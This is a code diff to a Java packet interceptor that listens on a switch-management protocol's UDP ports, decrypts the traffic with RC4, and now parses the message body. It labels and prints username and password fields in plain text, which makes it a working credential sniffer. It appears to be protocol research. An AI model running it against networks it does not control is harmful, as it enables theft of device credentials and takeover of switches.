@@ -1,13 +1,21 @@
 import java.io.IOException;
+import java.io.PrintStream;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetSocketAddress;
 import java.net.SocketException;
 import java.util.Arrays;
+import java.util.HashMap;
 
 public class Intercept {
 	private static final int CLIENT_COMMANDS = 29808;
 	private static final int SERVER_COMMANDS = 29809;
+	private static final HashMap<Short, String> TYPES = new HashMap<Short, String>();
+
+	static {
+		TYPES.put((short) 512, "Username");
+		TYPES.put((short) 514, "Password");
+	}
 
 	public static void main(String[] args) throws IOException {
 		new Thread(new Runnable() {
@@ -15,7 +23,7 @@ public class Intercept {
 			@Override
 			public void run() {
 				try {
-					listen(CLIENT_COMMANDS);
+					listen(CLIENT_COMMANDS, System.err);
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -27,7 +35,7 @@ public class Intercept {
 			@Override
 			public void run() {
 				try {
-					listen(SERVER_COMMANDS);
+					listen(SERVER_COMMANDS, System.out);
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -36,7 +44,8 @@ public class Intercept {
 		}).start();
 	}
 
-	private static void listen(int port) throws SocketException, IOException {
+	private static void listen(int port, PrintStream out)
+			throws SocketException, IOException {
 		try (DatagramSocket transferSocket = new DatagramSocket(
 				new InetSocketAddress(port))) {
 			transferSocket.setReuseAddress(true);
@@ -45,13 +54,15 @@ public class Intercept {
 				DatagramPacket localDatagramPacket = new DatagramPacket(crypt,
 						crypt.length);
 				transferSocket.receive(localDatagramPacket);
-				System.out.println("\n\n===NEW PACKET ON PORT " + port
-						+ " FROM " + localDatagramPacket.getAddress());
+				out.println("\n\n===NEW PACKET ON PORT " + port + " FROM "
+						+ localDatagramPacket.getAddress());
 				crypt = Arrays.copyOf(crypt, localDatagramPacket.getLength());
 				RC4.crypt(crypt);
-				System.out.println("Decrypted data:");
-				packet2Header(crypt);
-				System.out.println(" RAW: " + bytesToHex(crypt));
+				out.println("Decrypted data:");
+				int offset = packet2Header(crypt, out);
+				out.println("  BODY:");
+				readBody(crypt, offset, out);
+				out.println("  RAW: " + bytesToHex(crypt));
 			}
 		}
 	}
@@ -66,25 +77,46 @@ public class Intercept {
 		return data;
 	}
 
+	public static void readBody(byte[] data, int startOffset, PrintStream out) {
+		int i = startOffset;
+		while (i < data.length) {
+			out.println(" -START TLV-");
+			byte[] shortBuf = Arrays.copyOfRange(data, i, i + 2);
+			i += 2;
+			short type = byte2Short(shortBuf);
+			out.println("  TYPE:" + type + " (" + TYPES.get(type) + ")");
+
+			shortBuf = Arrays.copyOfRange(data, i, i + 2);
+			i += 2;
+			short length = byte2Short(shortBuf);
+			out.println("  LENGTH:" + length);
+
+			shortBuf = Arrays.copyOfRange(data, i, i + length);
+			i += length;
+			out.println("  BODY:" + bytesToHex(shortBuf) + " (String: "
+					+ new String(shortBuf) + ")");
+		}
+	}
+
 	// from decompiled com.tplink.smb.easySmartUtility.transfer.PacketHead
 	// modified
-	private static boolean packet2Header(byte[] paramArrayOfByte) {
+	private static int packet2Header(byte[] paramArrayOfByte, PrintStream out) {
 		if (paramArrayOfByte.length < 32) {
-			return false;
+			return 0;
 		}
 		int i = 0;
 		byte[] arrayOfByte1 = new byte[2];
 		byte[] arrayOfByte2 = new byte[4];
 		byte[] mac = new byte[6];
-		System.out.println(" Version:" + paramArrayOfByte[(i++)]);
-		System.out.println(" OPCODE:" + paramArrayOfByte[i++]);
+		out.println(" Version:" + paramArrayOfByte[(i++)]);
+		out.println(" OPCODE:" + paramArrayOfByte[i++]);
 		// setOpCode(paramArrayOfByte[(i++)]);
 		System.arraycopy(paramArrayOfByte, i, mac, 0, mac.length);
 		i += mac.length;
-		System.out.println(" MAC:" + bytesToHex(mac));
+		out.println(" MAC:" + bytesToHex(mac));
 		System.arraycopy(paramArrayOfByte, i, mac, 0, mac.length);
 		i += mac.length;
-		System.out.println(" HOST MAC:" + bytesToHex(mac));
+		out.println(" HOST MAC:" + bytesToHex(mac));
 		for (int k = 0; k < arrayOfByte1.length; k++) {
 			arrayOfByte1[k] = paramArrayOfByte[(i++)];
 		}
@@ -93,12 +125,12 @@ public class Intercept {
 		// if (j != sequenceNum) {
 		// return false;
 		// }
-		System.out.println(" SEQUENCE NUMBER:" + j);
+		out.println(" SEQUENCE NUMBER:" + j);
 		for (int k = 0; k < arrayOfByte2.length; k++) {
 			arrayOfByte2[k] = paramArrayOfByte[(i++)];
 		}
 		// setErrCode(TLV.byte2int(arrayOfByte2));
-		System.out.println(" ERROR CODE (7 or 8 are somehow bad):"
+		out.println(" ERROR CODE (7 or 8 are somehow bad):"
 				+ byte2int(arrayOfByte2));
 		// if (((Page.pageType == Page.PageType.NORMAL_PAGE) && (this.errCode ==
 		// 7))
@@ -108,22 +140,23 @@ public class Intercept {
 		for (int k = 0; k < arrayOfByte1.length; k++) {
 			arrayOfByte1[k] = paramArrayOfByte[(i++)];
 		}
-		System.out.println(" LENGTH:" + byte2Short(arrayOfByte1));
+		out.println(" LENGTH:" + byte2Short(arrayOfByte1));
 		for (int k = 0; k < arrayOfByte1.length; k++) {
 			arrayOfByte1[k] = paramArrayOfByte[(i++)];
 		}
-		System.out.println(" FRAGMENT OFFSET:" + byte2Short(arrayOfByte1));
+		out.println(" FRAGMENT OFFSET:" + byte2Short(arrayOfByte1));
 		i += 2;
 		for (int k = 0; k < arrayOfByte1.length; k++) {
 			arrayOfByte1[k] = paramArrayOfByte[(i++)];
 		}
-		System.out.println(" TOKEN ID:" + byte2Short(arrayOfByte1));
+		out.println(" TOKEN ID:" + byte2Short(arrayOfByte1));
 		for (int k = 0; k < arrayOfByte2.length; k++) {
 			arrayOfByte2[k] = paramArrayOfByte[(i++)];
 		}
-		System.out.println(" CHECKSUM (apparently not implemented):"
+		out.println(" CHECKSUM (apparently not implemented):"
 				+ byte2int(arrayOfByte2));
-		return true;
+
+		return i;
 	}
 
 	final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();
